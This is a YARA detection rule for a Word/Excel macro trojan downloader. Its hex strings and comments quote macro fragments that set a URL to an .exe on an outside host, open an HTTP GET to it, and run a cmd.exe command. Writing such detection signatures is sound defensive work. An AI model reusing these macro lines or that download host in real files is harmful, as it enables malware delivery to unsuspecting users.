
rule TrojanDownloader_O97M_EncDoc_KJ_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.KJ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {66 61 61 66 73 61 66 73 61 66 73 66 73 61 66 61 73 66 20 3d 20 22 68 74 74 70 3a 2f 2f 6f 6b 6f 6b 6f 6b 6f 6b 6f 6b 6f 6b 2e 6b 68 61 62 79 2e 6c 6f 6c 2f 4d 45 2e 65 78 65 22 } //1 faafsafsafsfsafasf = "http://okokokokokok.khaby.lol/ME.exe"
		$a_01_1 = {66 73 66 73 66 73 66 73 66 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 66 61 61 66 73 61 66 73 61 66 73 66 73 61 66 61 73 66 2c 20 46 61 6c 73 65 2c 20 22 75 73 65 72 6e 61 6d 65 22 2c 20 22 70 61 73 73 77 6f 72 64 22 } //1 fsfsfsfsf.Open "GET", faafsafsafsfsafasf, False, "username", "password"
		$a_01_2 = {66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 2e 52 75 6e 20 22 63 6d 64 2e 65 78 65 20 2f 6b 20 68 65 79 2e 74 78 74 22 2c 20 77 69 6e 64 6f 77 53 74 79 6c 65 2c 20 77 61 69 74 4f 6e 52 65 74 75 72 6e } //1 fffffffffffffffffff.Run "cmd.exe /k hey.txt", windowStyle, waitOnReturn
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}